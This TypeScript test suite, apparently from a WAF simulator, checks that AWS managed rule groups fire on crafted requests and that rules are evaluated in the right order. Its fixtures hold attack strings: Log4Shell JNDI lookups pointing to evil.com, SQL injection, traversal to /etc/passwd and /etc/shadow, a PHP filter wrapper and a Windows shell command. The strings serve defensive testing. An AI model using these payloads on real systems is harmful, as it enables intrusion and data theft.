// WAFSim - Comprehensive Sub-Rule Test Suite
// Generates targeted requests to trigger each managed rule group sub-rule independently
// and validates rule evaluation order correctness

import { HttpRequest, WebACL, Rule, Statement, EvaluationResult } from "@/lib/types";
import { MANAGED_RULE_GROUPS } from "@/lib/managedRuleGroups";
import { evaluateWebACL } from "@/engines/wafEngine";

export interface SubRuleTestCase {
  ruleGroupName: string;
  subRuleName: string;
  request: HttpRequest;
  expectedMatch: boolean;
  description: string;
}

export interface TestResult {
  testCase: SubRuleTestCase;
  passed: boolean;
  actualMatch: boolean;
  matchedRules: string[];
  finalAction: string;
  error?: string;
}

export interface OrderTestCase {
  name: string;
  description: string;
  rules: Rule[];
  request: HttpRequest;
  expectedFinalAction: string;
  expectedTerminatingRule?: string;
  expectedLabels?: string[];
}

export interface OrderTestResult {
  testCase: OrderTestCase;
  passed: boolean;
  actualFinalAction: string;
  actualTerminatingRule?: string;
  actualLabels: string[];
  error?: string;
}

const BASE_REQUEST: HttpRequest = {
  protocol: "HTTP/1.1",
  method: "GET",
  uri: "/",
  queryParams: {},
  headers: [
    { name: "Host", value: "example.com" },
    { name: "User-Agent", value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
  ],
  body: "",
  bodyEncoding: "none",
  contentType: "text/html",
  sourceIP: "203.0.113.50",
  country: "US",
};

function makeRequest(overrides: Partial<HttpRequest>): HttpRequest {
  return { ...BASE_REQUEST, ...overrides, headers: overrides.headers || BASE_REQUEST.headers };
}

/**
 * Generate test cases for each sub-rule in every managed rule group
 */
export function generateSubRuleTests(): SubRuleTestCase[] {
  const tests: SubRuleTestCase[] = [];

  // === AWSManagedRulesCommonRuleSet ===
  tests.push({
    ruleGroupName: "AWSManagedRulesCommonRuleSet",
    subRuleName: "NoUserAgent_HEADER",
    request: makeRequest({ headers: [{ name: "Host", value: "example.com" }] }),
    expectedMatch: true,
    description: "Request without User-Agent header",
  });
  tests.push({
    ruleGroupName: "AWSManagedRulesCommonRuleSet",
    subRuleName: "UserAgent_BadBots_HEADER",
    request: makeRequest({ headers: [{ name: "Host", value: "example.com" }, { name: "User-Agent", value: "sqlmap/1.5" }] }),
    expectedMatch: true,
    description: "Request with sqlmap User-Agent",
  });
  tests.push({
    ruleGroupName: "AWSManagedRulesCommonRuleSet",
    subRuleName: "SizeRestrictions_QUERYSTRING",
    request: makeRequest({ uri: "/search?" + "a".repeat(2100) }),
    expectedMatch: true,
    description: "Query string > 2048 chars",
  });
  tests.push({
    ruleGroupName: "AWSManagedRulesCommonRuleSet",
    subRuleName: "SizeRestrictions_BODY",
    request: makeRequest({ method: "POST", body: "x".repeat(8200) }),
    expectedMatch: true,
    description: "Body > 8192 bytes",
  });
  tests.push({
    ruleGroupName: "AWSManagedRulesCommonRuleSet",
    subRuleName: "SizeRestrictions_URIPATH",
    request: makeRequest({ uri: "/" + "a".repeat(520) }),
    expectedMatch: true,
    description: "URI path > 512 chars",
  });

  // === AWSManagedRulesKnownBadInputsRuleSet ===
  tests.push({
    ruleGroupName: "AWSManagedRulesKnownBadInputsRuleSet",
    subRuleName: "Log4JRCE_HEADER",
    request: makeRequest({ headers: [{ name: "Host", value: "example.com" }, { name: "User-Agent", value: "Mozilla/5.0" }, { name: "X-Api-Version", value: "${jndi:ldap://evil.com/x}" }] }),
    expectedMatch: true,
    description: "Log4Shell JNDI in header",
  });
  tests.push({
    ruleGroupName: "AWSManagedRulesKnownBadInputsRuleSet",
    subRuleName: "Log4JRCE_BODY",
    request: makeRequest({ method: "POST", body: '{"data": "${jndi:ldap://evil.com/a}"}' }),
    expectedMatch: true,
    description: "Log4Shell JNDI in body",
  });
  tests.push({
    ruleGroupName: "AWSManagedRulesKnownBadInputsRuleSet",
    subRuleName: "Log4JRCE_QUERYSTRING",
    request: makeRequest({ uri: "/api?q=${jndi:ldap://evil.com}" }),
    expectedMatch: true,
    description: "Log4Shell JNDI in query string",
  });

  // === AWSManagedRulesSQLiRuleSet ===
  tests.push({
    ruleGroupName: "AWSManagedRulesSQLiRuleSet",
    subRuleName: "SQLi_QUERYARGUMENTS",
    request: makeRequest({ uri: "/api?id=1' OR '1'='1" }),
    expectedMatch: true,
    description: "SQL injection in query argument",
  });
  tests.push({
    ruleGroupName: "AWSManagedRulesSQLiRuleSet",
    subRuleName: "SQLi_BODY",
    request: makeRequest({ method: "POST", body: "username=admin' OR 1=1--" }),
    expectedMatch: true,
    description: "SQL injection in body",
  });

  // === AWSManagedRulesLinuxRuleSet ===
  tests.push({
    ruleGroupName: "AWSManagedRulesLinuxRuleSet",
    subRuleName: "LFI_URIPATH",
    request: makeRequest({ uri: "/../../etc/passwd" }),
    expectedMatch: true,
    description: "LFI path traversal in URI",
  });
  tests.push({
    ruleGroupName: "AWSManagedRulesLinuxRuleSet",
    subRuleName: "LFI_QUERYSTRING",
    request: makeRequest({ uri: "/file?path=../../../etc/shadow" }),
    expectedMatch: true,
    description: "LFI path traversal in query",
  });

  // === AWSManagedRulesAdminProtectionRuleSet ===
  tests.push({
    ruleGroupName: "AWSManagedRulesAdminProtectionRuleSet",
    subRuleName: "AdminProtection_URIPATH",
    request: makeRequest({ uri: "/admin" }),
    expectedMatch: true,
    description: "Admin path access",
  });

  // === Negative tests (should NOT match) ===

  // === AWSManagedRulesPHPRuleSet ===
  tests.push({
    ruleGroupName: "AWSManagedRulesPHPRuleSet",
    subRuleName: "PHPInjection_BODY",
    request: makeRequest({ method: "POST", body: "file=php://filter/convert.base64-encode/resource=index" }),
    expectedMatch: true,
    description: "PHP stream wrapper in body",
  });

  // === AWSManagedRulesWordPressRuleSet ===
  tests.push({
    ruleGroupName: "AWSManagedRulesWordPressRuleSet",
    subRuleName: "WordPressExploitableCommands_QUERYSTRING",
    request: makeRequest({ uri: "/wp-admin/admin-ajax.php?action=revslider_show_image" }),
    expectedMatch: true,
    description: "WordPress exploitable command in query",
  });

  // === AWSManagedRulesWindowsRuleSet ===
  tests.push({
    ruleGroupName: "AWSManagedRulesWindowsRuleSet",
    subRuleName: "WindowsShellCommands_BODY",
    request: makeRequest({ method: "POST", body: "cmd.exe /c dir C:\\" }),
    expectedMatch: true,
    description: "Windows shell command in body",
  });

  // === Negative tests (should NOT match) ===
  tests.push({
    ruleGroupName: "AWSManagedRulesCommonRuleSet",
    subRuleName: "NoUserAgent_HEADER",
    request: makeRequest({}), // has User-Agent
    expectedMatch: false,
    description: "Normal request WITH User-Agent should not trigger NoUserAgent",
  });
  tests.push({
    ruleGroupName: "AWSManagedRulesCommonRuleSet",
    subRuleName: "SizeRestrictions_BODY",
    request: makeRequest({ method: "POST", body: "small body" }),
    expectedMatch: false,
    description: "Small body should not trigger size restriction",
  });
  tests.push({
    ruleGroupName: "AWSManagedRulesSQLiRuleSet",
    subRuleName: "SQLi_QUERYARGUMENTS",
    request: makeRequest({ uri: "/api?id=123" }),
    expectedMatch: false,
    description: "Normal query param should not trigger SQLi",
  });

  return tests;
}

/**
 * Run a single sub-rule test
 */
export function runSubRuleTest(testCase: SubRuleTestCase): TestResult {
  try {
    const webACL: WebACL = {
      id: "test-webacl",
      name: "TestWebACL",
      scope: "REGIONAL",
      defaultAction: "ALLOW",
      rules: [{
        name: testCase.ruleGroupName,
        priority: 1,
        statement: {
          type: "ManagedRuleGroupStatement",
          vendorName: "AWS",
          name: testCase.ruleGroupName,
        } as Statement,
        action: "BLOCK",
        overrideAction: "NONE",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: testCase.ruleGroupName },
      }],
      visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "test" },
      capacity: 0,
    };

    const result = evaluateWebACL(testCase.request, webACL);
    const matchedRuleNames = result.ruleTrace.filter(t => t.matched).map(t => t.ruleName);
    const actualMatch = result.finalAction === "BLOCK";

    return {
      testCase,
      passed: actualMatch === testCase.expectedMatch,
      actualMatch,
      matchedRules: matchedRuleNames,
      finalAction: result.finalAction,
    };
  } catch (e) {
    return {
      testCase,
      passed: false,
      actualMatch: false,
      matchedRules: [],
      finalAction: "ERROR",
      error: e instanceof Error ? e.message : String(e),
    };
  }
}

/**
 * Generate rule evaluation order test cases
 */
export function generateOrderTests(): OrderTestCase[] {
  const tests: OrderTestCase[] = [];

  // Test 1: COUNT rule should NOT terminate, next BLOCK rule should
  tests.push({
    name: "COUNT does not terminate",
    description: "A COUNT rule matches but evaluation continues to the next BLOCK rule",
    rules: [
      {
        name: "CountGeo", priority: 1,
        statement: { type: "GeoMatchStatement", countryCodes: ["US"] } as Statement,
        action: "COUNT",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "CountGeo" },
      },
      {
        name: "BlockAll", priority: 2,
        statement: { type: "ByteMatchStatement", searchString: "/", fieldToMatch: { type: "URI_PATH" }, textTransformations: [{ type: "NONE", priority: 1 }], positionalConstraint: "STARTS_WITH" } as Statement,
        action: "BLOCK",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "BlockAll" },
      },
    ],
    request: makeRequest({ country: "US" }),
    expectedFinalAction: "BLOCK",
    expectedTerminatingRule: "BlockAll",
  });

  // Test 2: ALLOW terminates before BLOCK
  tests.push({
    name: "ALLOW terminates before BLOCK",
    description: "Higher priority ALLOW rule prevents lower priority BLOCK from evaluating",
    rules: [
      {
        name: "AllowUS", priority: 1,
        statement: { type: "GeoMatchStatement", countryCodes: ["US"] } as Statement,
        action: "ALLOW",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "AllowUS" },
      },
      {
        name: "BlockAll", priority: 2,
        statement: { type: "ByteMatchStatement", searchString: "/", fieldToMatch: { type: "URI_PATH" }, textTransformations: [{ type: "NONE", priority: 1 }], positionalConstraint: "STARTS_WITH" } as Statement,
        action: "BLOCK",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "BlockAll" },
      },
    ],
    request: makeRequest({ country: "US" }),
    expectedFinalAction: "ALLOW",
    expectedTerminatingRule: "AllowUS",
  });

  // Test 3: Priority ordering (lower number = evaluated first)
  tests.push({
    name: "Priority ordering",
    description: "Rule with priority 5 evaluates before rule with priority 10",
    rules: [
      {
        name: "LowPriBlock", priority: 10,
        statement: { type: "ByteMatchStatement", searchString: "/api", fieldToMatch: { type: "URI_PATH" }, textTransformations: [{ type: "NONE", priority: 1 }], positionalConstraint: "STARTS_WITH" } as Statement,
        action: "BLOCK",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "LowPriBlock" },
      },
      {
        name: "HighPriAllow", priority: 5,
        statement: { type: "ByteMatchStatement", searchString: "/api", fieldToMatch: { type: "URI_PATH" }, textTransformations: [{ type: "NONE", priority: 1 }], positionalConstraint: "STARTS_WITH" } as Statement,
        action: "ALLOW",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "HighPriAllow" },
      },
    ],
    request: makeRequest({ uri: "/api/users" }),
    expectedFinalAction: "ALLOW",
    expectedTerminatingRule: "HighPriAllow",
  });

  // Test 4: Label propagation — rule 1 adds label, rule 2 matches it
  tests.push({
    name: "Label propagation",
    description: "COUNT rule adds label, subsequent LabelMatch rule triggers on it",
    rules: [
      {
        name: "TagSQLi", priority: 1,
        statement: { type: "ByteMatchStatement", searchString: "SELECT", fieldToMatch: { type: "QUERY_STRING" }, textTransformations: [{ type: "NONE", priority: 1 }], positionalConstraint: "CONTAINS" } as Statement,
        action: "COUNT",
        ruleLabels: ["awswaf:custom:sqli-detected"],
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "TagSQLi" },
      },
      {
        name: "BlockOnLabel", priority: 2,
        statement: { type: "LabelMatchStatement", key: "awswaf:custom:sqli-detected", scope: "LABEL" } as Statement,
        action: "BLOCK",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "BlockOnLabel" },
      },
    ],
    request: makeRequest({ uri: "/search?q=SELECT * FROM users" }),
    expectedFinalAction: "BLOCK",
    expectedTerminatingRule: "BlockOnLabel",
    expectedLabels: ["awswaf:custom:sqli-detected"],
  });

  // Test 5: No rules match — default action applies
  tests.push({
    name: "Default action when no rules match",
    description: "When no rules match, WebACL default action (ALLOW) applies",
    rules: [
      {
        name: "BlockRU", priority: 1,
        statement: { type: "GeoMatchStatement", countryCodes: ["RU"] } as Statement,
        action: "BLOCK",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "BlockRU" },
      },
    ],
    request: makeRequest({ country: "US" }),
    expectedFinalAction: "ALLOW",
  });

  // Test 6: AND statement — both conditions must match
  tests.push({
    name: "AND statement both match",
    description: "AND requires all nested statements to match",
    rules: [
      {
        name: "BlockRUAdmin", priority: 1,
        statement: {
          type: "AndStatement",
          statements: [
            { type: "GeoMatchStatement", countryCodes: ["RU"] } as Statement,
            { type: "ByteMatchStatement", searchString: "/admin", fieldToMatch: { type: "URI_PATH" }, textTransformations: [{ type: "NONE", priority: 1 }], positionalConstraint: "STARTS_WITH" } as Statement,
          ],
        } as Statement,
        action: "BLOCK",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "BlockRUAdmin" },
      },
    ],
    request: makeRequest({ uri: "/admin/settings", country: "RU" }),
    expectedFinalAction: "BLOCK",
    expectedTerminatingRule: "BlockRUAdmin",
  });

  // Test 7: AND statement — one condition fails
  tests.push({
    name: "AND statement partial match",
    description: "AND fails when one nested statement doesn't match",
    rules: [
      {
        name: "BlockRUAdmin", priority: 1,
        statement: {
          type: "AndStatement",
          statements: [
            { type: "GeoMatchStatement", countryCodes: ["RU"] } as Statement,
            { type: "ByteMatchStatement", searchString: "/admin", fieldToMatch: { type: "URI_PATH" }, textTransformations: [{ type: "NONE", priority: 1 }], positionalConstraint: "STARTS_WITH" } as Statement,
          ],
        } as Statement,
        action: "BLOCK",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "BlockRUAdmin" },
      },
    ],
    request: makeRequest({ uri: "/admin/settings", country: "US" }), // US, not RU
    expectedFinalAction: "ALLOW", // default action
  });

  // Test 8: NOT statement
  tests.push({
    name: "NOT statement inverts match",
    description: "NOT inverts: block requests NOT from US",
    rules: [
      {
        name: "BlockNonUS", priority: 1,
        statement: {
          type: "NotStatement",
          statement: { type: "GeoMatchStatement", countryCodes: ["US"] } as Statement,
        } as Statement,
        action: "BLOCK",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "BlockNonUS" },
      },
    ],
    request: makeRequest({ country: "CN" }),
    expectedFinalAction: "BLOCK",
    expectedTerminatingRule: "BlockNonUS",
  });

  // Test 9: OR statement — any condition matches
  tests.push({
    name: "OR statement any match",
    description: "OR matches when any nested statement matches",
    rules: [
      {
        name: "BlockBadGeos", priority: 1,
        statement: {
          type: "OrStatement",
          statements: [
            { type: "GeoMatchStatement", countryCodes: ["RU"] } as Statement,
            { type: "GeoMatchStatement", countryCodes: ["CN"] } as Statement,
            { type: "GeoMatchStatement", countryCodes: ["KP"] } as Statement,
          ],
        } as Statement,
        action: "BLOCK",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "BlockBadGeos" },
      },
    ],
    request: makeRequest({ country: "CN" }),
    expectedFinalAction: "BLOCK",
    expectedTerminatingRule: "BlockBadGeos",
  });

  // Test 10: Multiple COUNT rules accumulate labels
  tests.push({
    name: "Multiple COUNT rules accumulate labels",
    description: "Two COUNT rules both add labels, third rule matches on both",
    rules: [
      {
        name: "TagGeo", priority: 1,
        statement: { type: "GeoMatchStatement", countryCodes: ["US"] } as Statement,
        action: "COUNT",
        ruleLabels: ["awswaf:custom:geo-us"],
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "TagGeo" },
      },
      {
        name: "TagAPI", priority: 2,
        statement: { type: "ByteMatchStatement", searchString: "/api", fieldToMatch: { type: "URI_PATH" }, textTransformations: [{ type: "NONE", priority: 1 }], positionalConstraint: "STARTS_WITH" } as Statement,
        action: "COUNT",
        ruleLabels: ["awswaf:custom:api-request"],
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "TagAPI" },
      },
      {
        name: "BlockLabeledAPI", priority: 3,
        statement: { type: "LabelMatchStatement", key: "awswaf:custom:api-request", scope: "LABEL" } as Statement,
        action: "BLOCK",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "BlockLabeledAPI" },
      },
    ],
    request: makeRequest({ uri: "/api/users", country: "US" }),
    expectedFinalAction: "BLOCK",
    expectedTerminatingRule: "BlockLabeledAPI",
    expectedLabels: ["awswaf:custom:geo-us", "awswaf:custom:api-request"],
  });

  // Test 11: Managed rule group with COUNT override
  tests.push({
    name: "Managed rule group COUNT override",
    description: "Managed rule group with overrideAction=COUNT should not terminate",
    rules: [
      {
        name: "CRSCount", priority: 1,
        statement: { type: "ManagedRuleGroupStatement", vendorName: "AWS", name: "AWSManagedRulesCommonRuleSet" } as Statement,
        action: "BLOCK",
        overrideAction: "COUNT" as const,
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "CRS" },
      },
      {
        name: "AllowAll", priority: 2,
        statement: { type: "ByteMatchStatement", searchString: "/", fieldToMatch: { type: "URI_PATH" }, textTransformations: [{ type: "NONE", priority: 1 }], positionalConstraint: "STARTS_WITH" } as Statement,
        action: "ALLOW",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "AllowAll" },
      },
    ],
    request: makeRequest({ headers: [{ name: "Host", value: "example.com" }] }), // no UA triggers CRS
    expectedFinalAction: "ALLOW",
    expectedTerminatingRule: "AllowAll",
  });

  // Test 12: SizeConstraint with text transformation
  tests.push({
    name: "SizeConstraint after URL decode",
    description: "Size check on URL-decoded content",
    rules: [
      {
        name: "BlockLargeQuery", priority: 1,
        statement: { type: "SizeConstraintStatement", fieldToMatch: { type: "QUERY_STRING" }, comparisonOperator: "GT", size: 10, textTransformations: [{ type: "URL_DECODE", priority: 1 }] } as Statement,
        action: "BLOCK",
        visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "BlockLargeQuery" },
      },
    ],
    request: makeRequest({ uri: "/search?q=this+is+a+long+query+string" }),
    expectedFinalAction: "BLOCK",
    expectedTerminatingRule: "BlockLargeQuery",
  });

  return tests;
}

/**
 * Run a single order test
 */
export function runOrderTest(testCase: OrderTestCase): OrderTestResult {
  try {
    const webACL: WebACL = {
      id: "test-webacl",
      name: "OrderTestWebACL",
      scope: "REGIONAL",
      defaultAction: "ALLOW",
      rules: testCase.rules,
      visibilityConfig: { sampledRequestsEnabled: true, cloudWatchMetricsEnabled: true, metricName: "test" },
      capacity: 0,
    };

    const result = evaluateWebACL(testCase.request, webACL);

    let passed = result.finalAction === testCase.expectedFinalAction;
    if (testCase.expectedTerminatingRule && result.terminatingRule) {
      passed = passed && result.terminatingRule.rule.name === testCase.expectedTerminatingRule;
    }
    if (testCase.expectedLabels) {
      passed = passed && testCase.expectedLabels.every(l => result.labelsApplied.includes(l));
    }

    return {
      testCase,
      passed,
      actualFinalAction: result.finalAction,
      actualTerminatingRule: result.terminatingRule?.rule.name,
      actualLabels: result.labelsApplied,
    };
  } catch (e) {
    return {
      testCase,
      passed: false,
      actualFinalAction: "ERROR",
      actualLabels: [],
      error: e instanceof Error ? e.message : String(e),
    };
  }
}

/**
 * Run all tests and return summary
 */
export function runAllTests(): {
  subRuleResults: TestResult[];
  orderResults: OrderTestResult[];
  summary: { total: number; passed: number; failed: number };
} {
  const subRuleTests = generateSubRuleTests();
  const orderTests = generateOrderTests();

  const subRuleResults = subRuleTests.map(runSubRuleTest);
  const orderResults = orderTests.map(runOrderTest);

  const allResults = [...subRuleResults.map(r => r.passed), ...orderResults.map(r => r.passed)];

  return {
    subRuleResults,
    orderResults,
    summary: {
      total: allResults.length,
      passed: allResults.filter(Boolean).length,
      failed: allResults.filter(r => !r).length,
    },
  };
}
